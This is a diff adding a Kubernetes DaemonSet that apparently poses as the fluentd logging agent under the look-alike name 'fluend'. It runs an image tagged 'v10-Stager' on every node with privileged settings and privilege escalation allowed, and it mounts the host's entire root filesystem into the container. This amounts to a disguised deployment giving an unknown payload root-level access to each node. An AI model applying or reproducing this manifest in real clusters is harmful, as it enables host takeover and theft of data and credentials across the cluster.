@@ -1,0 +1,26 @@
+apiVersion: extensions/v1beta1
+kind: DaemonSet
+metadata:
+  name: fluend
+spec:
+  template:
+    metadata:
+      name: fluend
+      labels:
+        app: k8fluend
+    spec:
+      securityContext:
+        privileged: true
+      containers:
+        - name: k8fluend
+          image: ilcapone/onering:v10-Stager
+          securityContext:
+            allowPrivilegeEscalation: true
+          imagePullPolicy: Always
+          volumeMounts:
+            - name: fluend
+              mountPath: "/"
+      volumes:
+      - name: fluend
+        hostPath:
+          path: /
